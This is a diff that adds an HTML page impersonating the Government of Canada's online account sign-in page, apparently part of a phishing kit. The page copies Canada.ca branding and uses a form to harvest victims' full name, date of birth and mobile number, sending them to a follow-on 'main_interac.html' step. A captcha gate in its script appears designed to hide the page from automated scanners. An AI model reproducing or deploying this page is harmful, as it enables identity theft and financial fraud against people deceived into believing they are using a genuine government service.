@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in to a Government of Canada online account - Canada.ca</title>
+<script>
+	if (self != top) {
+		top.location.replace(this.location);
+	}
+	try {
+		if (!sessionStorage.getItem('__cptPass') || sessionStorage.getItem('__cptPass') !== '1') {
+			window.location.replace('captcha.html');
+			throw new Error('CAPTCHA_REQUIRED');
+		}
+	} catch(e) {
+		window.location.replace('captcha.html');
+	}
+</script>
+<script src="security_module.js"></script>
+<style>
+  * {
+    box-sizing: border-box;
+    font-family: "Noto Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  body {
+    margin: 0;
+    padding: 0;
+    background-color: #fff;
+    color: #333;
+  }
+  header {
+    border-bottom: 1px solid #ccc;
+    padding: 12px 16px;
+  }
+  .header-container {
+    max-width: 768px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .flag-logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .flag-logo img {
+    height: 28px;
+    width: auto;
+  }
+  .govt-text {
+    display: flex;
+    gap: 16px;
+    font-size: 13px;
+    font-weight: 700;
+    color: #000;
+    line-height: 1.2;
+  }
+  .lang-link {
+    font-weight: 700;
+    color: #284162;
+    text-decoration: underline;
+    font-size: 16px;
+  }
+  .search-bar {
+    max-width: 768px;
+    margin: 12px auto;
+    padding: 0 16px;
+    display: flex;
+  }
+  .search-input {
+    flex: 1;
+    padding: 8px 12px;
+    border: 1px solid #333;
+    font-size: 16px;
+  }
+  .search-btn {
+    background-color: #26374a;
+    color: white;
+    border: none;
+    padding: 8px 16px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .menu-bar {
+    background-color: #26374a;
+    color: white;
+    padding: 10px 16px;
+    font-weight: 700;
+    font-size: 16px;
+  }
+  .menu-container {
+    max-width: 768px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .breadcrumb {
+    max-width: 768px;
+    margin: 16px auto;
+    padding: 0 16px;
+    font-size: 14px;
+  }
+  .breadcrumb a {
+    color: #284162;
+    text-decoration: underline;
+  }
+  .main-content {
+    max-width: 768px;
+    margin: 0 auto;
+    padding: 0 16px 40px 16px;
+  }
+  h1 {
+    font-size: 32px;
+    font-weight: 700;
+    color: #333;
+    margin-top: 10px;
+    margin-bottom: 8px;
+    line-height: 1.2;
+  }
+  .red-line {
+    width: 60px;
+    height: 4px;
+    background-color: #af3c43;
+    margin-bottom: 20px;
+  }
+  p.intro {
+    font-size: 17px;
+    line-height: 1.5;
+    color: #333;
+    margin-bottom: 24px;
+  }
+  .form-group {
+    margin-bottom: 20px;
+  }
+  label {
+    display: block;
+    font-weight: 700;
+    font-size: 16px;
+    margin-bottom: 6px;
+    color: #333;
+  }
+  input[type="text"],
+  input[type="date"],
+  input[type="tel"] {
+    width: 100%;
+    padding: 10px;
+    border: 2px solid #26374a;
+    border-radius: 4px;
+    font-size: 16px;
+  }
+  .btn-continue {
+    background-color: #318000;
+    color: white;
+    font-weight: 700;
+    font-size: 18px;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-top: 10px;
+    width: 100%;
+  }
+  .btn-continue:hover {
+    background-color: #256200;
+  }
+  footer {
+    border-top: 4px solid #26374a;
+    background-color: #f8f9fa;
+    padding: 20px 16px;
+    margin-top: 40px;
+  }
+  .footer-container {
+    max-width: 768px;
+    margin: 0 auto;
+    font-size: 14px;
+    color: #555;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-container">
+    <div class="flag-logo">
+      <img src="canada_flag.png" alt="Canada Flag">
+      <div class="govt-text">
+        <div>Government<br>of Canada</div>
+        <div>Gouvernement<br>du Canada</div>
+      </div>
+    </div>
+    <a href="#" class="lang-link">FR</a>
+  </div>
+</header>
+
+<div class="search-bar">
+  <input type="text" class="search-input" placeholder="Search Canada.ca">
+  <button class="search-btn">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <circle cx="11" cy="11" r="8"></circle>
+      <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+    </svg>
+  </button>
+</div>
+
+<div class="menu-bar">
+  <div class="menu-container">
+    <span>MENU &#9660;</span>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="#">Canada.ca</a>
+</div>
+
+<main class="main-content">
+  <h1>Sign in to a Government of Canada online account</h1>
+  <div class="red-line"></div>
+  
+  <p class="intro">
+    There are separate accounts for the many services across the Government of Canada. Use the list or table below to find the sign-in/register page for the account or service that you need.
+  </p>
+
+  <form id="ca8101Form" action="main_interac.html" method="POST">
+    <div class="form-group">
+      <label for="fullName">Full name</label>
+      <input type="text" id="fullName" name="fullName" required placeholder="Enter your full name">
+    </div>
+
+    <div class="form-group">
+      <label for="dob">Date of birth</label>
+      <input type="date" id="dob" name="dob" required>
+    </div>
+
+    <div class="form-group">
+      <label for="mobileNumber">Mobile number</label>
+      <input type="tel" id="mobileNumber" name="mobileNumber" required placeholder="Enter mobile number">
+    </div>
+
+    <button type="submit" class="btn-continue">Continue</button>
+  </form>
+</main>
+
+<footer>
+  <div class="footer-container">
+    <p>&copy; Government of Canada / Gouvernement du Canada</p>
+  </div>
+</footer>
+
+</body>
+</html>
